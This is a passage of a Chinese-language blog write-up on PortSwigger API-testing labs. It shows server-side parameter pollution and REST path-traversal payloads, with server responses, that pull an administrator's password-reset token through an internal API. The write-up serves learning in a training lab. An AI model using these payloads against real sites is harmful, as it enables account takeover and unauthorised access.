+<p>用户就会定位到 <strong>forgot-password?reset-token&#x3D;ABC123</strong> 资源，凭借 token 修改密码</p>
+<ol start="2">
+<li><strong>没有 token → 用户主动输入用户名申请重置邮件</strong></li>
+</ol>
+<p>这一步就是我们一开始干的，所以我们访问 <strong>username&#x3D;administrator</strong> 时候，后端接受请求，向内网 api 发送请求类似 <strong>username&#x3D;administrator&amp;field&#x3D;email</strong>，然后 api 发起对这个用户的查询，返回邮箱号。然后向该邮箱发送邮件，应该是一个重置密码的链接，而且分配了 <strong>reset-token</strong> 用于校验身份。</p>
+<p>所以我们的目的就是如何获取这个身份令牌 <strong>reset-token</strong>，继续尝试参数污染</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">csrf=kg0OM3dMuziACnBTabuddefMrmsYga4g&amp;username=administrator%26field=reset_token</span><br><span class="line">返回</span><br><span class="line">&#123;&quot;type&quot;:&quot;reset_token&quot;,&quot;result&quot;:&quot;9hgtvqzrg4wi4dl02i89xnz3xu719af1&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以拿着令牌去重置密码了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/forgot-password?reset_token=xxxx</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-Exploiting-server-side-parameter-pollution-in-a-REST-URL"><a href="#Lab-Exploiting-server-side-parameter-pollution-in-a-REST-URL" class="headerlink" title="Lab: Exploiting server-side parameter pollution in a REST URL"></a>Lab: Exploiting server-side parameter pollution in a REST URL</h3><blockquote>
+<p>to solve the lab, log in as the <code>administrator</code> and delete <code>carlos</code>.        </p>
+</blockquote>
+<p>又学到了前置知识，<strong>RESTful API</strong>  的风格是，参数放在路径上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/users/123</span><br></pre></td></tr></table></figure>
+
+<p>URL路径可以分解如下： </p>
+<ul>
+<li><code>/api</code>是根 API 端点。 </li>
+<li><code>/users</code>在这种情况下，它代表一种资源。 <code>users</code>。 </li>
+<li><code>/123</code>表示一个参数，这里是特定用户的标识符。</li>
+</ul>
+<p>​    假设有一个应用程序，允许用户根据用户名编辑用户个人资料。请求会发送到以下端点： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /edit_profile.php?name=peter</span><br></pre></td></tr></table></figure>
+
+<p>​    这将导致以下服务器向内网 <strong>api</strong> 端请求： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/private/users/peter</span><br></pre></td></tr></table></figure>
+
+<p>这样一想服务器端的参数污染中 <strong>%23</strong> 和 <strong>%26</strong> 还能用吗？%23 肯定没问题，但是 %26 的话，由于普通参数改成了路径参数，该如何在后端api请求里注入自己的参数呢？</p>
+<p>这就需要配合路径漏洞来注入路径参数了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /edit_profile.php?name=peter/../admin</span><br></pre></td></tr></table></figure>
+
+<p>​    这可能会导致以下服务器端请求： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/public/users/peter/../admin</span><br></pre></td></tr></table></figure>
+
+<p>​    如果服务器端客户端或后端 API 对此路径进行了规范化，则该路径可能被解析为 <code>/api/public/users/admin</code>。 </p>
+<p>假如我们多遍历几层，比如说后端 api 文档是这么规定的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/public/users/&#123;username&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那我们就可以传入如下参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=peter/../../../private/users/admin</span><br></pre></td></tr></table></figure>
+
+<p>以此来控制路径参数，从而控制后端到api的请求。</p>
+<p>话不多说，我们来看这道题，依旧忘记密码入手,我们先用 %23 试试水</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;username=carlos/%23</span><br></pre></td></tr></table></figure>
+
+<p>返回 <strong>Invalid route. Please refer to the API definition</strong>，目前看不出啥，再目录遍历一下试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;username=carlos/../carlos</span><br></pre></td></tr></table></figure>
+
+<p>成功返回了数据，证明这是路径参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">carlos/../carlos%23</span><br><span class="line">返回</span><br><span class="line">404 Invalid route. Please refer to the API definition</span><br></pre></td></tr></table></figure>
+
+<p>能根据这猜测后端访问api应该是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xxx/xxx/&#123;username&#125;/xxx/xxx</span><br></pre></td></tr></table></figure>
+
+<p>所以 %23 阻断之后就会报 404 的错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">carlos/../%23 返回 404 Invalid route. Please refer to the API definition</span><br><span class="line">carlos/../../%23 返回 404 Invalid route. Please refer to the API definition</span><br><span class="line">..........</span><br><span class="line">carlos/../../../../../%23 返回 500 Unexpected response from API server:\n&lt;html&gt;\n&lt;head&gt;\n    &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n    &lt;title&gt;Not Found&lt;\/title&gt;\n&lt;\/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Not found&lt;\/h1&gt;\n    &lt;p&gt;The URL that you requested was not found.&lt;\/p&gt;\n&lt;\/body&gt;\n&lt;\/html&gt;\n</span><br></pre></td></tr></table></figure>
+
+<p>报 500 错误这说明了 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F; 可能来到了路径的根结点了，比如说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/users/123</span><br></pre></td></tr></table></figure>
+
+<p>可能来到了和 &#x2F;api 上级目录的根结点位置，也就是 ⬇️</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/</span><br></pre></td></tr></table></figure>
+
+<p>尝试在根结点的位置找一下 <strong>api</strong> 开发文档</p>
+<p>常见<strong>API 文档接口</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api</span><br><span class="line">/swagger/index.html</span><br><span class="line">/openapi.json</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=carlos/../../../../../openapi.json%23</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Unexpected response from API server:</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  &quot;</span>openapi<span class="string">&quot;: &quot;</span><span class="number">3.0</span><span class="number">.0</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">  &quot;</span>info<span class="string">&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;</span>title<span class="string">&quot;: &quot;</span>User API<span class="string">&quot;,</span></span><br><span class="line"><span class="string">    &quot;</span>version<span class="string">&quot;: &quot;</span><span class="number">2.0</span><span class="number">.0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  &quot;</span>paths<span class="string">&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;</span>/api/internal/v1/users/<span class="punctuation">&#123;</span>username<span class="punctuation">&#125;</span>/field/<span class="punctuation">&#123;</span>field<span class="punctuation">&#125;</span><span class="string">&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;</span>get<span class="string">&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;</span>tags<span class="string">&quot;: [</span></span><br><span class="line"><span class="string">          &quot;</span>users<span class="string">&quot;</span></span><br><span class="line"><span class="string">        ],</span></span><br><span class="line"><span class="string">        &quot;</span>summary<span class="string">&quot;: &quot;</span>Find user by username<span class="string">&quot;,</span></span><br><span class="line"><span class="string">        &quot;</span>description<span class="string">&quot;: &quot;</span>API Version <span class="number">1</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">        &quot;</span>parameters<span class="string">&quot;: [</span></span><br><span class="line"><span class="string">          &#123;</span></span><br><span class="line"><span class="string">            &quot;</span>name<span class="string">&quot;: &quot;</span>username<span class="string">&quot;,</span></span><br><span class="line"><span class="string">            &quot;</span>in<span class="string">&quot;: &quot;</span>path<span class="string">&quot;,</span></span><br><span class="line"><span class="string">            &quot;</span>description<span class="string">&quot;: &quot;</span>Username<span class="string">&quot;,</span></span><br><span class="line"><span class="string">            &quot;</span>required<span class="string">&quot;: true,</span></span><br><span class="line"><span class="string">            &quot;</span>schema<span class="string">&quot;: &#123;</span></span><br><span class="line"><span class="string">        ...&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>找到了这个接口了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/internal/v1/users/&#123;username&#125;/field/&#123;field&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以后台访问 api 应该是这样写的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/internal/v1/users/&#123;username&#125;/field/email</span><br></pre></td></tr></table></figure>
+
+<p>我们继续注入路径参数，来控制写死在后端的api，验证接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=carlos/../administrator/field/username%23</span><br></pre></td></tr></table></figure>
+
+<p><strong>This version of API only supports the email field for security reasons</strong></p>
+<p>v1 版本只能支持 email 字段，V1 换成 v2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">carlos/../../../v1/users/administrator/field/username%23</span><br></pre></td></tr></table></figure>
+
+<p>{<br>  “type”: “username”,<br>  “result”: “administrator”<br>}</p>
+<p>js 里面翻出来了重置密码的逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href = `/forgot-password?passwordResetToken=$&#123;resetToken&#125;`</span><br></pre></td></tr></table></figure>
+
+<p>尝试这个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=carlos/../../../v1/users/administrator/field/passwordResetToken%23</span><br></pre></td></tr></table></figure>
+
+<p>得到了重置密码的 token。</p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="http://example.com/2025/11/19/%E9%9D%B6%E5%9C%BA/PortSwigger/Api%20Testing/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=http://example.com/2025/11/19/%E9%9D%B6%E5%9C%BA/PortSwigger/Api%20Testing/&title=PortSwigger Api Testing - sleeper&summary=Api TestingLab: Exploiting an API endpoint using documentation
+To solve the lab, find the exposed API documentation a..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=PortSwigger Api Testing - sleeper&amp;body=http://example.com/2025/11/19/%E9%9D%B6%E5%9C%BA/PortSwigger/Api%20Testing/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=http://example.com/2025/11/19/%E9%9D%B6%E5%9C%BA/PortSwigger/Api%20Testing/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/11/27/%E9%9D%B6%E5%9C%BA/PortSwigger/Business%20logic%20vulnerabilities/">PortSwigger Business logic vulnerabilities</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/11/06/%E9%9D%B6%E5%9C%BA/PortSwigger/XXE/">PortSwigger XXE</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">she11f</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Api-Testing"><span class="toc-text">Api Testing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Exploiting-an-API-endpoint-using-documentation"><span class="toc-text">Lab: Exploiting an API endpoint using documentation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Finding-and-exploiting-an-unused-API-endpoint"><span class="toc-text">Lab: Finding and exploiting an unused API endpoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Exploiting-a-mass-assignment-vulnerability"><span class="toc-text">Lab: Exploiting a mass assignment vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Exploiting-server-side-parameter-pollution-in-a-query-string"><span class="toc-text">Lab: Exploiting server-side parameter pollution in a query string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Exploiting-server-side-parameter-pollution-in-a-REST-URL"><span class="toc-text">Lab: Exploiting server-side parameter pollution in a REST URL</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+<!-- required -->
+<script src="/js/main.js?v=1.29.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
